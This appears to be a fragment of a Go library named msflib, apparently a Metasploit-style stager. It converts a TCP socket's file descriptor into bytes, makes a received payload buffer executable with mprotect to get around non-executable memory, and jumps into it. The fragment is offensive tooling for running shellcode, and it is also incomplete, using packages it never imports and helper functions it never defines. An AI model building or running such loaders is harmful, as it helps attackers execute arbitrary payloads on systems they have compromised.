package msflib

import (
	"bytes"
	"log"
	"syscall"
	"unsafe"
)

// return a socket file descriptor as 4 bytes
func getFDBytes(conn *net.TCPConn) []byte {
	buff := new(bytes.Buffer)
	binary.Write(buff, binary.LittleEndian, conn.File().Fd())
	return buff.Bytes()
}

func callPayload(payload []byte) {
	payload = prepPayload(payload)

	// dissable NX
	err := syscall.Mprotect(payload, 0x04) // PROT_EXEC
	if err != nil {
		log.Fatal(err)
	}

	// call
	caller((uintptr)(unsafe.Pointer(&payload[0])))
}
